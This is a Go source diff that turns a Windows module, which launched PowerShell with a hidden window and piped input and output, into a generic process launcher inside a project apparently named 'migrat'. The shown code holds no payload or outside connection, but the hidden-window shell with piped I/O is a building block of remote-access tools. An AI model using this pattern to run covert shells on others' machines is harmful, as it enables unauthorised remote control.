@@ -1,35 +1,33 @@
-//go:build windows
-
-package main
+package module
 
 import (
 	"log"
+	"migrat/constants"
 	"os/exec"
-	"syscall"
 )
 
-type ShellError struct{}
+type ProcessError struct{}
 
-func (e *ShellError) Error() string {
-	return "shell error"
+func (e *ProcessError) Error() string {
+	return "Process error"
 }
 
-func init_shell() (*Module, error) {
-	log.Println("loading system shell")
-	command := exec.Command("powershell")
-	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+func process_start(name string, processname string, args []string) (*Module, error) {
+	log.Println("process_start --> name: ", name, " processname: ", processname, " args: ", args)
+	command := exec.Command(processname, args...)
+	command.SysProcAttr = constants.SYSPROCATTR
 	outpipe, err1 := command.StdoutPipe()
 	inpipe, err2 := command.StdinPipe()
 	errpipe, err3 := command.StderrPipe()
 
 	if err1 != nil || err2 != nil || err3 != nil {
 		log.Println(err1.Error(), err2.Error(), err3.Error())
-		return nil, &ShellError{}
+		return nil, &ProcessError{}
 	}
 
 	module := &Module{
 		finished: make(chan bool, 1),
-		name:     "shell",
+		name:     name,
 		external: true,
 		args:     []string{},
 		in:       make(chan string, 1),
@@ -45,7 +43,7 @@ func init_shell() (*Module, error) {
 		module.finished <- true
 		log.Println("module finished: ", module.name)
 	}()
-	log.Println("shell started")
+	log.Println("process started")
 
 	return module, nil
 }
